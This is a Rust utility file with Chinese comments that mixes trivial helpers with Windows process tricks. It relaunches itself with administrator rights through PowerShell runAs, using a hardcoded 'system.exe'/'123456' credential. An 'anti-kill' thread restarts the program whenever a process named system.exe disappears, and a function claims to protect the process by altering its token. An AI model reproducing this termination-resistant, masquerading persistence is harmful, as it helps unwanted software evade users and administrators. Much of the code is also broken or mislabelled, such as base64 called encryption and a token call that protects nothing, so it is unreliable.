//pub mod system;

// pub mod sys;



use std::any::Any;
use std;
use std::collections::HashMap;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::SetTokenInformation;
use winapi::um::winnt::{HANDLE, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES};
use winapi::um::handleapi::CloseHandle;

pub struct Pass {}
impl Pass {
    pub fn new() -> Self {
        Pass {}
    }
}


// 列表 list
pub struct List(Vec<Box<dyn Any>>);
impl List {
    pub fn new() -> Self {
        List(vec![])
    }

    pub fn add_item(&mut self, item: Box<dyn Any>) {
        self.0.push(item);
    }

    pub fn get_items(&self) -> &Vec<Box<dyn Any>> {
        &self.0
    }
}


pub fn unzip(a: i32) {
    let mut dict = HashMap::new();
    dict.insert(1,1);
}



pub fn open_url_manual(url: &str) -> Result<(), String> {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", "start", url])
            .spawn()
            .map_err(|e| format!("无法打开浏览器: {}", e))?;
    } else if cfg!(target_os = "macos") {
        Command::new("open")
            .arg(url)
            .spawn()
            .map_err(|e| format!("无法打开浏览器: {}", e))?;
    } else if cfg!(target_os = "linux") {
        Command::new("xdg-open")
            .arg(url)
            .spawn()
            .map_err(|e| format!("无法打开浏览器: {}", e))?;
    } else {
        return Err("不支持的操作系统".to_string());
    }

    println!("成功打开浏览器并导航到: {}", url);
    Ok(())
}

use base64::{self, engine::general_purpose::STANDARD, Engine};

pub fn encrypt_base64(input: &str) -> String {
    STANDARD.encode(input)
}

pub fn decrypt_base64(encoded: &str) -> String {
    String::from_utf8(base64::decode(encoded).unwrap()).unwrap()
}


/* 
fn main() {
    let url = "https://www.rust-lang.org";
    match open_url_manual(url) {
        Ok(_) => println!("操作完成！"),
        Err(err) => eprintln!("错误: {}", err),
    }
}
    */
// use std::process::Command;


pub fn login(username: &str, password: &str) -> bool {
    // 获取当前程序的完整路径
    let exe_path = std::env::current_exe().unwrap().to_str().unwrap().to_string();

    // 使用 PowerShell 提升权限并静默登录
    let argument_list = format!("\"{} {}\"", username, password); // 用双引号包裹用户名和密码
    let status = Command::new("powershell")
        .arg("-Command")
        .arg("Start-Process")
        .arg("-FilePath")
        .arg(&exe_path) // 当前程序路径
        .arg("-ArgumentList")
        .arg(&argument_list) // 传递用户名和密码
        .arg("-Verb")
        .arg("runAs") // 以管理员权限运行
        .status()
        .expect("Failed to execute PowerShell command");

    // 检查命令是否成功
    if status.success() {
        println!("管理员权限登录成功！");
        true
    } else {
        println!("管理员权限登录失败！");
        false
    }
}

pub fn add_anti_kill() {
    // 启动反 kill 线程
    std::thread::spawn(|| {
        loop {
            let output = Command::new("tasklist")
                .arg("/FI")
                .arg("IMAGENAME eq system.exe")
                .output()
                .expect("Failed to execute command");

            let output_str = String::from_utf8_lossy(&output.stdout);
            if !output_str.contains("system.exe") {
                Command::new("cmd")
                    .arg("/C")
                    .arg(format!("start {}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy()))
                    .stdout(std::process::Stdio::null())
                    .spawn()
                    .expect("Failed to restart system.exe");
            }

            std::thread::sleep(std::time::Duration::from_secs(5));
        }
    });

    println!("反 kill 措施已启动！");
}

pub fn protect_process() {
    unsafe {
        let mut token: HANDLE = std::ptr::null_mut();
        let process = winapi::um::processthreadsapi::GetCurrentProcess();

        // 打开当前进程的令牌
        if OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) != 0 {
            // 设置令牌信息，限制访问权限
            let privileges = TOKEN_PRIVILEGES {
                PrivilegeCount: 0,
                Privileges: [std::mem::zeroed()],
            };
            SetTokenInformation(
                token,
                winapi::um::winnt::TokenPrivileges,
                &privileges as *const _ as *mut _,
                std::mem::size_of_val(&privileges) as u32,
            );
            CloseHandle(token);
        }
    }
    println!("令牌信息已设置，进程保护已启动！");
}
pub fn main() {
    let username = "system.exe";
    let password = "123456";

    // 登录管理员权限
    if login(username, password) {
        println!("登录成功，已获得管理员权限！");
    } else {
        println!("登录失败，请检查用户名或密码！");
        return;
    }

    // 启动反 kill 措施
    add_anti_kill();
}

// Regex
// 以/xxx/的格式

pub struct Regex(String);
impl Regex {
    pub fn new(pattern: &str) -> Self {
        Regex(pattern.to_string())
    }

    pub fn pattern(&self) -> &str {
        &self.0
    }
}
// 将形如/a/自动识别为Regex,代码:
// 我的意思是编译器会把/xxx/自动识别成regex, 就像""会自动识别成str

